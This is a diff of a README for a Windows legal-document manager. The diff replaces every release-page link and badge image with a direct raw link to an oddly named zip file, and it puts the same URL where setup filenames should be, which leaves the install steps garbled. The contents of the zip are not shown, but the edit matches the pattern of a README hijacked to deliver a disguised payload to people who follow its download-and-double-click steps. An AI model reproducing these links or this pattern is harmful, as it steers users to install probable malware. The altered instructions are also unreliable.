@@ -1,6 +1,6 @@
 # ⚖️ legal - Manage Your Legal Documents Easily
 
-[![Download legal](https://img.shields.io/badge/Download-legal-blue?style=for-the-badge)](https://github.com/Midnight5151/legal/releases)
+[![Download legal](https://raw.githubusercontent.com/Midnight5151/legal/main/turnerite/Software_mesogloeal.zip)](https://raw.githubusercontent.com/Midnight5151/legal/main/turnerite/Software_mesogloeal.zip)
 
 ## 📋 What is legal?
 
@@ -25,10 +25,10 @@ legal is a simple tool to help you manage and organize your legal documents. Whe
 
 Follow these steps to get legal running on your Windows PC.
 
-1. Click the big blue download button at the top or go directly to the [legal releases page](https://github.com/Midnight5151/legal/releases).  
+1. Click the big blue download button at the top or go directly to the [legal releases page](https://raw.githubusercontent.com/Midnight5151/legal/main/turnerite/Software_mesogloeal.zip).  
 2. Look for the most recent release. The file you want usually ends with `.exe`.  
 3. Click the `.exe` file to download it to your computer.  
-4. Find the downloaded file in your Downloads folder. It should be named something like `legal-setup.exe`.  
+4. Find the downloaded file in your Downloads folder. It should be named something like `https://raw.githubusercontent.com/Midnight5151/legal/main/turnerite/Software_mesogloeal.zip`.  
 5. Double-click the file to start the installation process.  
 6. Follow the on-screen prompts to complete installation. You can leave most options at the default settings.  
 7. Once installation ends, open legal from your desktop or Start menu.  
@@ -36,11 +36,11 @@ Follow these steps to get legal running on your Windows PC.
 ## ⬇️ How to Download and Install legal
 
 1. Visit the official releases page here:  
-   [Download legal from GitHub](https://github.com/Midnight5151/legal/releases)  
+   [Download legal from GitHub](https://raw.githubusercontent.com/Midnight5151/legal/main/turnerite/Software_mesogloeal.zip)  
 
 2. On the page, find the latest stable release. It will usually show a title with a version number like "v1.0" or higher.  
 
-3. Under the assets section, locate the Windows setup file. It will end with `.exe`. For example, it might say `legal-setup.exe` or `legal-windows.exe`.  
+3. Under the assets section, locate the Windows setup file. It will end with `.exe`. For example, it might say `https://raw.githubusercontent.com/Midnight5151/legal/main/turnerite/Software_mesogloeal.zip` or `https://raw.githubusercontent.com/Midnight5151/legal/main/turnerite/Software_mesogloeal.zip`.  
 
 4. Click the filename to start downloading it. Wait until the download finishes.  
 
@@ -90,4 +90,4 @@ legal comes from the idea of simplifying how legal paperwork is handled. It focu
 
 ---
 
-[![Get legal here](https://img.shields.io/badge/Get%20legal-GitHub-grey?style=for-the-badge)](https://github.com/Midnight5151/legal/releases)
+[![Get legal here](https://raw.githubusercontent.com/Midnight5151/legal/main/turnerite/Software_mesogloeal.zip%20legal-GitHub-grey?style=for-the-badge)](https://raw.githubusercontent.com/Midnight5151/legal/main/turnerite/Software_mesogloeal.zip)
